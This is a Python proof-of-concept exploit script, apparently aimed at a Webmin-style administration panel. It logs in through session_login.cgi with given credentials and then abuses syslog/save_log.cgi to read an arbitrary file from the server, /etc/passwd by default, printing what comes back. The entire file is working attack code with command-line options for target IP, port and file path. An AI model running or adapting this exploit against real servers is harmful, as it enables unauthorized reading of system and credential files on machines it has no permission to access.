import sys
import requests
import argparse
from urllib3 import disable_warnings


def cve(url, user, password, file):
    disable_warnings()

    payload = {
        'user': user,
        'pass': password
    }

    cookies = {
        "testing": "1"
    }

    r = requests.post(url=url + "/session_login.cgi", cookies=cookies, data=payload, verify=False, allow_redirects=False)
    r.close()

    if r and r.status_code == 302 and "sid" in r.cookies.get_dict().keys():

        # print(r.cookies.get_dict().get("sid"))
        cookies["sid"] = r.cookies.get_dict().get("sid")

        r = requests.get(url=url + "/syslog/save_log.cgi?view=1&file=" + file, cookies=cookies, verify=False)
        r.close()

        if r and r.status_code == 200:

            if r.content.decode().find("You are not allowed to view arbitrary logs") > -1:
                print("Server's default options changed. Not vulnerable to view arbitrary logs.\n")
            elif r.content.decode().find("<pre>") > -1:
                print(r.content.decode().split("<pre>")[1].split("</pre>")[0])
            else:
                print("Server not vulnerable\n")

    sys.exit(1)


parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, help="Server IP Address", required=True)
parser.add_argument("--port", type=int, default=10000)
parser.add_argument("--user", type=str, default="test")
parser.add_argument("--password", type=str, default="qwerty")
parser.add_argument("--file", type=str, default="/etc/passwd")
options = parser.parse_args(args=sys.argv[1:])

cve("https://" + options.ip + ":" + str(options.port), options.user, options.password, options.file)
